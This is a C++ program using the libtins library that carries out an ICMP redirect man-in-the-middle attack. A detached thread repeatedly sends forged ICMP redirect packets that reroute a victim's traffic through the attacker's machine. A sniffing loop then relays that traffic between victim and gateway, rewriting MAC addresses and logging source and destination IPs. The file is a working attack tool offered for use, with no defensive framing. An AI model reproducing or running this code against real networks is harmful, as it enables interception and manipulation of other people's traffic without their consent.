#define TINS_STATIC
#include <tins/tins.h>
#include <iostream>
#include <string>
#include <stdexcept>
#include <cstdlib>
#include <string>
#include <thread>
#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#else
#include <unistd.h>
#endif // _WIN32
#include <winsock2.h>
#include <WS2tcpip.h>
#include <regex>
#include<process.h>
#include<vector>
using namespace std;
using namespace Tins;

void icmp_redirect(NetworkInterface iface, IPv4Address gw, IPv4Address attack, IPv4Address victim, IPv4Address route_ip, const NetworkInterface::Info& info)
{
	PacketSender sender;
	EthernetII::address_type attack_hw, victim_hw, gw_hw;
	attack_hw = info.hw_addr; // my macaddress get
	victim_hw = Utils::resolve_hwaddr(iface, victim, sender); // victim macaddress get
	gw_hw = Utils::resolve_hwaddr(iface, gw, sender);
	cout << " Using victim hw address:  " << victim_hw << "\n";
	cout << " Using own hw address:     " << info.hw_addr << "\n";
	ICMP icmp;
	icmp.set_redirect(1, (IPv4Address)htonl(attack));
	uint8_t *data;
	data = (uint8_t *)malloc(8);
	memset(data, NULL, 8);

	while (true) {

			EthernetII victim_icmp = EthernetII(victim_hw, attack_hw) / IP(victim, gw) / icmp / IP(route_ip, victim) / RawPDU(data, 8);
			sender.send(victim_icmp, iface);	
#ifdef _WIN32
		Sleep(50);
#else
		sleep(5);
#endif
	}
}
void relay(PDU *some_pdu, NetworkInterface iface, EthernetII::address_type attack_hw, EthernetII::address_type victim_hw, EthernetII::address_type gw_hw)
{
	PacketSender sender;
	EthernetII *eth = some_pdu->find_pdu<EthernetII>();
	IP *ip = some_pdu->find_pdu<IP>();
	if (ip != NULL)
	{
		if ((eth->src_addr().to_string() == victim_hw.to_string()))
		{
			cout << "victim -> attack " << endl;
			cout << "eth src :" << eth->src_addr() << endl;
			cout << "eth dst :" << eth->dst_addr() << endl;
			cout << "SRC ip :" << ip->src_addr() << endl;
			cout << "dst ip :" << ip->dst_addr() << endl;	
			eth->src_addr(attack_hw);
			eth->dst_addr(gw_hw);
			some_pdu->send(sender, iface.name());
			
		}
		else if ((eth->dst_addr().to_string() == attack_hw.to_string()))
		{
			cout << "web -> attack " << endl;
			cout << "eth src :" << eth->src_addr() << endl;
			cout << "eth dst :" << eth->dst_addr() << endl;
			cout << "SRC ip :" << ip->src_addr() << endl;
			cout << "dst ip :" << ip->dst_addr() << endl;
			eth->dst_addr(victim_hw);
			eth->src_addr(attack_hw);
			some_pdu->send(sender, iface.name());
		}
	}
}

int main(int argc, char* argv[]) {
	if (argc != 5) {
		cout << "Usage: " << *argv << " <Gateway> <Attack> <Victim> <route_ip>" << endl;
		return 1;
	}
	PacketSender sender;
	EthernetII::address_type attack_hw, victim_hw, gw_hw;
	IPv4Address gw, victim, attack ,route_ip;
	try {
		gw = argv[1];
		attack = argv[2];
		victim = argv[3];
		route_ip = argv[4];
		cout << "gate way ip : " << gw << endl;
		cout << "attack ip : " << attack << endl;
		cout << "victim ip : " << victim << endl;
	}
	catch (...) {
		cout << "Invalid ip found...\n";
		return 2;
	}
	NetworkInterface iface;
	NetworkInterface::Info info;
	try {
		iface = gw;
		info = iface.addresses();
		attack_hw = info.hw_addr;
		victim_hw = Utils::resolve_hwaddr(iface, victim, sender); // victim macaddress get
		gw_hw = Utils::resolve_hwaddr(iface, gw, sender); // gateway macaddress get
	}
	catch (runtime_error& ex) {
		cout << ex.what() << endl;
		return 3;
	}
	try {

		std::thread infect(icmp_redirect, iface, gw, attack, victim, route_ip, info);
		infect.detach();
	}
	catch (runtime_error& ex) {
		cout << "Runtime error: " << ex.what() << endl;
		return 7;
	}
	Sniffer sniff(iface.name());
	cout << "relay.." << endl;
	while (true)
	{
		PDU *pdu = sniff.next_packet();
		relay(pdu, iface, attack_hw, victim_hw, gw_hw);
		delete pdu;
	}
	return 0;
}
